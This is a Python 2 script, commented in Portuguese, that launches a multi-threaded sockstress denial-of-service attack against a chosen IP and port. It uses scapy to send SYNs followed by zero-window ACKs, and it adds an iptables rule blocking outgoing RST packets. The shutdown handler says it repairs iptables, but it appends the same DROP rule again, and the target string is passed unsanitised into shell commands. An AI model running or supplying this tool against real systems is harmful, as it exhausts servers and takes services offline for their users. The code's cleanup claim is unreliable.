#!/usr/bin/python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz a tentiva de 
  DoS em Sockstress

  Modificado em 13 de outubro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importando as bibliotecas necessárias
from time import sleep
import thread
import logging
import os
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

if len(sys.argv) != 4:
	print "Use - python sock_stress.py [IP] [Porta] [Threads]"
	print "Exemplo - python sock_stress.py 10.0.0.5 21 20"
	print "Ele irá fazer um ataque 20x multi-threaded sock-stress DoS"
	print "contra o serviço de FTP (porta 21)"
	print "\n***OBS***"
	print "Certifique-se alvo de uma porta que responde quando é feita uma conexão"
	sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

## É aqui que a mágica acontece Ahahahah!
def sockstress(target,dstport):
	while 0 == 0:
		try:
			x = random.randint(0,65535)
			response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
			send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
		except:
			pass

## função de desligamento que permite reparar a tabela IP
def graceful_shutdown(signal, frame):
	print '\nVocê pressiocou o Ctrl+C!'
	print 'Arrumando o IPTables'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
	sys.exit()

## Cria-se uma regra de IPTables para impedir a saída de pacotes RST para permitir conexões TCP scapy
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

## Começa os vários segmentos para lançar um ataque
print "\nA investida começou... use o Ctrl+C para parar o ataque!"
for x in range(0,threads):
	thread.start_new_thread(sockstress, (target,dstport))

## Torná-lo ir para sempre (... ou pelo menos até aperte o Ctrl + C)
while 0 == 0:
	sleep(1)
